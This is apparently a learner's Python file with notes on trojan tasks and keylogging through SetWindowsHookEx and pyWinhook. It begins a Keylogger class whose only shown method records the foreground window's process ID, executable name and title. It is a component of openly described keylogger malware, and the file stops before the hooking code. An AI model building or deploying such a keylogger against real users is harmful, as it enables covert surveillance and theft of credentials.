# 𝗧𝗿𝗼𝗷𝗮𝗻 𝗰𝗼𝗺𝗺𝗼𝗻 𝘁𝗮𝘀𝗸𝘀: 
#   - grab keystrokes
#   - take screenshots 
#   - execute shellcode toprovide interactive sessions like CANVAS OR Metasploit
# 𝗞𝗲𝘆𝗹𝗼𝗴𝗴𝗶𝗻𝗴:
#   - Have a programm running in the back to record keystrokes
#   -  Good with 𝘗𝘺𝘞𝘪𝘯𝘏𝘰𝘰𝘬 (Windows oriented ovi)
#   - PyWinHook comes from the og 𝘗𝘺𝘏𝘰𝘰𝘬 and exploits 𝘚𝘦𝘵𝘞𝘪𝘯𝘥𝘰𝘸𝘴𝘏𝘰𝘰𝘬𝘌𝘹 
#   - SetWindowsHookEx allows to install user-defined functions to be called for certain Windows events
#   - The trojan would set a process againts keyboard events, to record the keystrokes
#   - It also records what processes the keys were ussed on

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as PyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class Keylogger:
    def __init__(self):
        self.current_window = None
    
    def get_current_process(self):
        # 𝘨𝘦𝘵_𝘤𝘶𝘳𝘳𝘦𝘯𝘵_𝘱𝘳𝘰𝘤𝘦𝘴𝘴(𝘴𝘦𝘭𝘧) captures active window and associated proc Id 
        hwnd = windll.user32.GetForegroundWindow() # Returns active win handdle
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # Get proc Id
        process_id = f'{pid.value}'
        
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid) 
        # Open process
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512
        ) # Get exec name
        
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title),512)
        # Get name from win title bar
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: Window name unknown')
        
        print('\n', process_id, executable.value.decode(), self.current_window)
        # Output all info
        
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)


    
    